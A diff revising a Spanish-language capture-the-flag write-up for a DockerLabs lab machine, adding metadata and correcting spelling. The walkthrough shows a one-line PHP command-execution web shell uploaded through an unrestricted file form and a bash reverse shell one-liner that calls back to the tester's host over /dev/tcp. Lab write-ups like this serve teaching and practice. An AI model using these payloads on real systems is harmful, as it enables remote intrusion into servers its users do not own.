@@ -2,36 +2,54 @@
 Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
-Dificultad: Facil
+Dificultad: Fácil
 VectorInicial: Unrestricted File Upload → RCE
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - No
+Usuarios:
+ - www-data
 Privesc: sudo env
+Tecnicas:
+ - Service Enumeration
+ - Unrestricted File Upload
+ - Web Shell
+ - Reverse Shell
+ - SUID Abuse
+ - Privilege Escalation
+Herramientas:
+ - nmap
+ - dirb
+ - navegador
+ - penelope
 Fecha: 2026-02-04
 ---
 <img width="927" height="559" alt="Pasted image 20260203193639" src="https://github.com/user-attachments/assets/b76b81e7-698a-4d05-b63b-587e78048c8e" />
 
-Lo primero que realizaremos es un escaneo de puertos hacia la IP de la maquina para ver que servicios corren:
+Lo primero que realizaremos es un escaneo de puertos hacia la IP de la máquina para ver qué servicios corren:
 
 ```bash
 nmap -sSVC -n -Pn 172.17.0.2
 ```
 
-Con lo que obtenemos que solo esta abierto el puerto 80:
+Con ello obtenemos que solo está abierto el puerto 80:
 
 <img width="853" height="341" alt="Pasted image 20260203194025" src="https://github.com/user-attachments/assets/2f1db8aa-18f6-45ef-a39d-1e5da441b32f" />
 
-Procedemos a ver que hay en dicha dirección desde el navegador
+Procedemos a ver qué hay en dicha dirección desde el navegador.
 
 <img width="417" height="223" alt="Pasted image 20260203194138" src="https://github.com/user-attachments/assets/d9799e5b-f218-44ff-bdb7-74e62189ae3a" />
 
-Solo hay una opción para subir ficheros, así que probaremos a subir un fichero para obtener una webshell o un basic rce.
+Solo hay una opción para subir ficheros, así que probaremos a subir un fichero para obtener una `web shell` o una ejecución remota básica.
 
-Para un basi rce podemos usar el siguiente código en un fichero **shell.php**
+Para una ejecución remota básica podemos usar el siguiente código en un fichero `shell.php`:
 
 ```php
 <?php system($_GET["cmd"]);?>
 ```
 
-Para un webshell usaremos el siguiente código en un fichero shell.php
+Para una `web shell` usaremos el siguiente código en un fichero `shell.php`:
 
 ```php
 <?php
@@ -641,13 +659,13 @@ if (isset($_GET["feature"])) {
 </html>
 ```
 
-El fichero se sube sin problemas pero no indica en la carpeta que se alojo el fichero
+El fichero se sube sin problemas, pero no indica en qué carpeta se ha alojado.
 
 <img width="379" height="242" alt="Pasted image 20260203194848" src="https://github.com/user-attachments/assets/3f7c51f3-4ac7-4df6-8753-112c6e2d499b" />
 
-Ahora tendremos que realizar un descubrimiento de directorios para ver donde esta alojado el fichero.
+Ahora tendremos que realizar un descubrimiento de directorios para ver dónde está alojado el fichero.
 
-Con la aplicación de **dirb** ha sido suficiente para encontrar el directorio don se alojan las subidas
+Con la aplicación **dirb** ha sido suficiente para encontrar el directorio donde se alojan las subidas.
 
 ```bash
 dirb http://172.17.0.2
@@ -655,32 +673,32 @@ dirb http://172.17.0.2
 
 <img width="519" height="519" alt="Pasted image 20260203195208" src="https://github.com/user-attachments/assets/91a877b9-1c77-41ce-8824-1daea3186480" />
 
-Ahora nos dirigimos a la url  http://172.17.0.2/uploads para ver si encontramos nuestro fichero.
+Ahora nos dirigimos a la URL `http://172.17.0.2/uploads` para ver si encontramos nuestro fichero.
 
 <img width="485" height="220" alt="Pasted image 20260203195418" src="https://github.com/user-attachments/assets/4d56daeb-8199-47bd-83e8-213c17776ff0" />
 
-Y aquí tenemos nuestro fichero, ahora solo tenemos que pulsar en el para obtener una Webshell
+Y aquí tenemos nuestro fichero; ahora solo tenemos que abrirlo para obtener una `web shell`.
 
 <img width="1835" height="841" alt="Pasted image 20260203195511" src="https://github.com/user-attachments/assets/009b3699-1fde-457f-939a-650011583a7f" />
 
-Y ya estamos dentro de la maquina y comprobamos si podemos escalar privilegios, pero desafortunadamente desde la Webshell no podemos hacer una escalada de privilegios.
+Y ya estamos dentro de la máquina y comprobamos si podemos escalar privilegios, pero desafortunadamente desde la `web shell` no podemos hacerlo con comodidad.
 
 <img width="1036" height="216" alt="Pasted image 20260203200458" src="https://github.com/user-attachments/assets/b70e431b-e813-4252-a64c-0cfef5d39d13" />
 
-Por este motivo intentaremos realizar un reverseshell con el siguiente comando ejecutado en webshell
+Por este motivo intentaremos realizar una `reverse shell` con el siguiente comando ejecutado desde la `web shell`.
 
 ```bash
 bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
 ```
 
-Mientras escuchamos en el puerto 443 desde penelope y obtenemos el acceso a la maquina
+Mientras escuchamos en el puerto 443 con **penelope**, obtenemos acceso a la máquina.
 
 <img width="852" height="488" alt="Pasted image 20260203201019" src="https://github.com/user-attachments/assets/7564e8a4-e609-4bcb-a1d3-1fa09253c4dd" />
 
 # Conclusión
 
-Con este CTF vemos como se puede realizar un RFI (Remote File Inclusion) al no encontrase sanitizado el formulario de subida de archivos y los peligros que esto puede conllevar.
+Con este laboratorio vemos cómo una subida de archivos sin controles adecuados puede derivar en ejecución remota de código, con todos los riesgos que ello conlleva.
 
 ---
-Si te gusto puedes invitarme a un cafe.
+Si te gustó, puedes invitarme a un café.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
